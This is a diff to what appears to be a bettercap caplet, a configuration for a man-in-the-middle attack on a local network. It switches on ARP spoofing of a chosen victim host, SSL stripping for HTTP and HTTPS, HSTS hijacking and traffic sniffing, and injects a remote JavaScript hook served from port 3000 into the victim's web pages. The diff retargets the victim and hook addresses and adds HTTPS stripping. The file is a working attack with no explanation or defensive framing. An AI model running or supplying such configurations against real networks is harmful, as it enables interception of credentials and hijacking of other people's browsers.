@@ -1,9 +1,10 @@
 net.probe on
 set http.proxy.sslstrip true
-set http.proxy.inject.js 192.168.120.243:3000/hook.js
+set https.proxy.sslstrip true
+set http.proxy.inject.js 192.168.110.243:3000/hook.js
 http.proxy on
 set arp.spoof.fullduplex true 
-set arp.spoof.targets 192.168.120.74 
+set arp.spoof.targets 192.168.110.129 
 arp.spoof on
 net.sniff on
 hstshijack/hstshijack
